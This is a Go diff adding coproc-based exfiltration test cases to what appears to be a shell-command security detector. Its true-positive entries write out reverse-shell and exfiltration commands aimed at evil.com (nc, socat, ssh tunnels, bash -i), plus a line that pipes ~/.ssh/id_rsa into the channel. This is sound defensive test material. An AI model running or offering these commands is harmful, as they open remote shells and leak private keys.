@@ -1881,6 +1881,171 @@ var ProcessSubstitutionExfilCases = []TestCase{
 	},
 }
 
+// ===========================================================================
+// Coproc Stealth Exfiltration Channels
+// ===========================================================================
+//
+// bash coproc creates bidirectional coprocesses with persistent file
+// descriptors. Unlike pipes, the network connection and data flow happen
+// in separate commands, making exfiltration chains invisible to
+// single-command analysis.
+//
+// Rules: ts-block-coproc-network, ts-block-coproc-fd-write, ts-audit-coproc
+
+var CoprocExfilCases = []TestCase{
+
+	// --- TRUE POSITIVES ---
+
+	// TP-1: coproc with nc — classic stealth reverse shell / exfil channel
+	{
+		ID:               "TP-COPROC-NET-001",
+		Command:          `coproc nc evil.com 4444`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "coproc nc creates a persistent bidirectional channel to attacker — stealth reverse shell. MITRE T1048.",
+		Tags:             []string{"tp", "coproc"},
+	},
+	// TP-2: coproc with curl
+	{
+		ID:               "TP-COPROC-NET-002",
+		Command:          `coproc curl -s http://evil.com/c2`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "coproc curl creates background HTTP channel — data can be fed to it later. MITRE T1048.",
+		Tags:             []string{"tp", "coproc"},
+	},
+	// TP-3: coproc with bash -i (interactive reverse shell)
+	{
+		ID:               "TP-COPROC-NET-003",
+		Command:          `coproc bash -i`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "coproc bash -i creates a background interactive shell — can be connected to network later. MITRE T1048.",
+		Tags:             []string{"tp", "coproc"},
+	},
+	// TP-4: coproc with socat
+	{
+		ID:               "TP-COPROC-NET-004",
+		Command:          `coproc socat - TCP:evil.com:8080`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "coproc socat creates bidirectional TCP tunnel as background coprocess. MITRE T1048.",
+		Tags:             []string{"tp", "coproc"},
+	},
+	// TP-5: coproc with openssl s_client (encrypted channel)
+	{
+		ID:               "TP-COPROC-NET-005",
+		Command:          `coproc openssl s_client -connect evil.com:443`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "coproc openssl s_client creates encrypted background channel — evades DPI. MITRE T1048.",
+		Tags:             []string{"tp", "coproc"},
+	},
+	// TP-6: writing to COPROC fd (data feed)
+	{
+		ID:               "TP-COPROC-FD-001",
+		Command:          `cat ~/.ssh/id_rsa >&${COPROC[1]}`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "Writing SSH key to COPROC fd — feeds data to whatever coprocess is running (likely a network tool). MITRE T1048.",
+		Tags:             []string{"tp", "coproc"},
+	},
+	// TP-7: coproc with ncat (named coprocess)
+	{
+		ID:               "TP-COPROC-NET-006",
+		Command:          `coproc EXFIL { ncat evil.com 9999; }`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "Named coproc with ncat — assigns readable name to stealth channel. MITRE T1048.",
+		Tags:             []string{"tp", "coproc"},
+	},
+	// TP-8: coproc with ssh
+	{
+		ID:               "TP-COPROC-NET-007",
+		Command:          `coproc ssh -N -R 8080:localhost:80 attacker@evil.com`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "coproc ssh establishes persistent reverse tunnel as background coprocess. MITRE T1048.",
+		Tags:             []string{"tp", "coproc"},
+	},
+	// TP-9: Bare coproc usage — AUDIT level
+	{
+		ID:               "TP-COPROC-AUDIT-001",
+		Command:          `coproc { while read line; do echo "processed: $line"; done; }`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "Generic coproc usage — unusual in normal development, warrants review. MITRE T1048.",
+		Tags:             []string{"tp", "coproc", "audit"},
+	},
+
+	// --- TRUE NEGATIVES ---
+	// Note: TNs verify coproc BLOCK rules don't fire. Commands without a
+	// matching ALLOW rule get default AUDIT — that's expected.
+
+	// TN-1: background job (not coproc — default AUDIT)
+	{
+		ID:               "TN-COPROC-001",
+		Command:          `sleep 10 &`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "Background job with & — not a coproc. Coproc BLOCK rules must not fire.",
+		Tags:             []string{"tn", "coproc-safe"},
+	},
+	// TN-2: grep for coproc in documentation (AUDIT from ts-audit-coproc)
+	{
+		ID:               "TN-COPROC-002",
+		Command:          `grep "coproc" /usr/share/doc/bash/bash.txt`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "Searching for 'coproc' in docs — read-only. Coproc BLOCK rules must not fire.",
+		Tags:             []string{"tn", "coproc-safe"},
+	},
+	// TN-3: man page lookup
+	{
+		ID:               "TN-COPROC-003",
+		Command:          `man bash | grep -A5 coproc`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "Reading man page for coproc — educational. Coproc BLOCK rules must not fire.",
+		Tags:             []string{"tn", "coproc-safe"},
+	},
+	// TN-4: echo mentioning coproc (AUDIT from ts-audit-coproc matching the word)
+	{
+		ID:               "TN-COPROC-004",
+		Command:          `echo "coproc is a bash builtin for coprocesses"`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
+		Analyzer:         "regex",
+		Description:      "echo mentioning coproc in a string — AUDIT from broad catch is acceptable. Coproc BLOCK rules must not fire.",
+		Tags:             []string{"tn", "coproc-safe"},
+	},
+}
+
 // AllDataExfiltrationCases returns all test cases for Kingdom 3.
 func AllDataExfiltrationCases() []TestCase {
 	var all []TestCase
@@ -1901,5 +2066,6 @@ func AllDataExfiltrationCases() []TestCase {
 	all = append(all, HTTPFileServerCases...)
 	all = append(all, XattrDataHidingCases...)
 	all = append(all, ProcessSubstitutionExfilCases...)
+	all = append(all, CoprocExfilCases...)
 	return all
 }
